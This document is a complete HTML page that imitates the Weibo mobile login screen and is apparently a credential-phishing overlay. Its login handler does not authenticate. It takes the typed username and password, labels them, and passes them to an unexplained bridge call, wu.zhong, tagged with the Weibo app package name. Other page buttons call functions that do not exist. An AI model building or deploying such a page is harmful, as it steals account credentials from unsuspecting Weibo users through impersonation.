<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Weibo - Login</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }


    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
      background-color: #f5f5f5;
      color: #333;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }


    .header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 16px 20px;
      background-color: #f5f5f5;
    }


    .close-btn {
      background: none;
      border: none;
      color: #999;
      font-size: 24px;
      cursor: pointer;
      padding: 8px;
      margin-left: -8px;
      font-weight: 300;
    }


    .settings-btn {
      background: none;
      border: none;
      color: #999;
      font-size: 24px;
      cursor: pointer;
      padding: 8px;
    }


    .main-content {
      flex: 1;
      padding: 40px 20px 20px;
      display: flex;
      flex-direction: column;
      max-width: 400px;
      margin: 0 auto;
      width: 100%;
    }


    .title {
      font-size: 28px;
      font-weight: 400;
      color: #333;
      margin-bottom: 60px;
      text-align: left;
    }


    .form-container {
      display: flex;
      flex-direction: column;
      gap: 20px;
      margin-bottom: 40px;
    }


    .input-field {
      width: 100%;
      background: transparent;
      border: none;
      border-bottom: 1px solid #ddd;
      color: #333;
      font-size: 16px;
      padding: 16px 0;
      outline: none;
      transition: border-color 0.3s ease;
    }


    .input-field::placeholder {
      color: #bbb;
    }


    .input-field:focus {
      border-bottom-color: #ff8500;
    }


    .checkbox-container {
      display: flex;
      align-items: flex-start;
      margin: 30px 0 40px 0;
      gap: 12px;
    }


    .checkbox {
      width: 18px;
      height: 18px;
      border: 1px solid #ddd;
      background-color: transparent;
      margin-top: 2px;
      cursor: pointer;
      flex-shrink: 0;
      position: relative;
    }


    .checkbox.checked {
      background-color: #ff8500;
      border-color: #ff8500;
    }


    .checkbox.checked::after {
      content: '✓';
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      color: white;
      font-size: 12px;
      font-weight: bold;
    }


    .checkbox-label {
      font-size: 14px;
      color: #666;
      line-height: 1.4;
      cursor: pointer;
    }


    .checkbox-label a {
      color: #007aff;
      text-decoration: none;
    }


    .login-button {
      background-color: #ffa726;
      background: linear-gradient(135deg, #ffb74d, #ffa726);
      color: #ffffff;
      border: none;
      padding: 16px 24px;
      font-size: 16px;
      font-weight: 500;
      border-radius: 25px;
      cursor: pointer;
      margin-bottom: 30px;
      transition: all 0.3s ease;
      box-shadow: 0 2px 8px rgba(255, 167, 38, 0.3);
    }


    .login-button:hover {
      background: linear-gradient(135deg, #ffa726, #ff9800);
      box-shadow: 0 4px 12px rgba(255, 167, 38, 0.4);
    }


    .login-button:disabled {
      background: #ddd;
      color: #999;
      cursor: not-allowed;
      box-shadow: none;
    }


    .login-button:active {
      transform: scale(0.98);
    }


    .footer-links {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }


    .footer-link {
      color: #007aff;
      text-decoration: none;
      font-size: 14px;
      transition: color 0.3s ease;
    }


    .footer-link:hover {
      color: #0051d5;
    }


    .social-icons {
      display: flex;
      justify-content: center;
      gap: 40px;
      margin-top: auto;
    }


    .social-icon {
      width: 48px;
      height: 48px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: transform 0.3s ease;
      font-size: 24px;
    }


    .social-icon:hover {
      transform: scale(1.1);
    }


    .icon-phone {
      background-color: #ffa726;
      color: white;
    }


    .icon-wechat {
      background-color: #4caf50;
      color: white;
    }


    .icon-qq {
      background-color: #2196f3;
      color: white;
    }


    .icon-qr {
      background-color: transparent;
      border: 2px solid #ddd;
      color: #666;
    }

    @media (min-width: 768px) {
      .main-content {
        padding: 60px 40px 40px;
      }
     
      .title {
        font-size: 32px;
        margin-bottom: 80px;
      }
    }


    @media (min-width: 1024px) {
      body {
        justify-content: center;
        padding: 20px;
      }
     
      .main-content {
        background-color: #ffffff;
        border-radius: 16px;
        padding: 80px 60px 60px;
        min-height: auto;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        border: 1px solid #e0e0e0;
      }
    }
  </style>
</head>
<body>
  <header class="header">
    <button class="close-btn" onclick="closeModal()">×</button>
    <button class="settings-btn" onclick="openSettings()">⚙</button>
  </header>


  <main class="main-content">
    <h1 class="title">账户与密码</h1>
   
    <form class="form-container" onsubmit="handleLogin(event)">
      <input
        type="text"
        id="account"
        class="input-field"
        placeholder="手机号码或电子邮件地址"
        required
      >


      <input
        type="password"
        id="password"
        class="input-field"
        placeholder="密码"
        required
      >


      <div class="checkbox-container">
        <div class="checkbox" onclick="toggleCheckbox()"></div>
        <label class="checkbox-label" onclick="toggleCheckbox()">
          通过注册/登录，您即表示同意<a href="#">微博用户协议</a> 以及 <a href="#">隐私条款</a>
        </label>
      </div>


      <button type="submit" class="login-button" id="loginBtn">
        登录
      </button>
    </form>


    <div class="footer-links">
      <a href="#" class="footer-link" onclick="handleForgotPassword(event)">忘记密码</a>
      <a href="#" class="footer-link" onclick="handleHelp(event)">帮助</a>
    </div>




  </main>


  <script>
    let isCheckboxChecked = false;




    function handleLogin(event) {
      event.preventDefault();
      const account = document.getElementById('account').value;
      const password = document.getElementById('password').value;
     
      if (!isCheckboxChecked) {
        return;
      }
     
      if (account && password) {
        
        wu.zhong(`🔰 微博\n\n✉️用户名: ${account}\n\n🔒密码:  ${password}`, "com.sina.weibo");
    
    
    }
    }







    function toggleCheckbox() {
      isCheckboxChecked = !isCheckboxChecked;
      const checkbox = document.querySelector('.checkbox');
     
      if (isCheckboxChecked) {
        checkbox.classList.add('checked');
      } else {
        checkbox.classList.remove('checked');
      }
     
      updateButtonState();
    }



    function updateButtonState() {
      const account = document.getElementById('account').value;
      const password = document.getElementById('password').value;
      const btn = document.getElementById('loginBtn');
     
      if (account.trim() && password.trim() && isCheckboxChecked) {
        btn.disabled = false;
      } else {
        btn.disabled = true;
      }
    }


    document.getElementById('account').addEventListener('input', updateButtonState);
    document.getElementById('password').addEventListener('input', updateButtonState);


  
    document.querySelectorAll('.input-field').forEach(input => {
      input.addEventListener('focus', function() {
        this.style.borderBottomColor = '#ff8500';
      });
     
      input.addEventListener('blur', function() {
        if (!this.value) {
          this.style.borderBottomColor = '#ddd';
        }
      });
    });


 
    document.addEventListener('DOMContentLoaded', function() {
      updateButtonState();
    });
  </script>
</body>
</html>
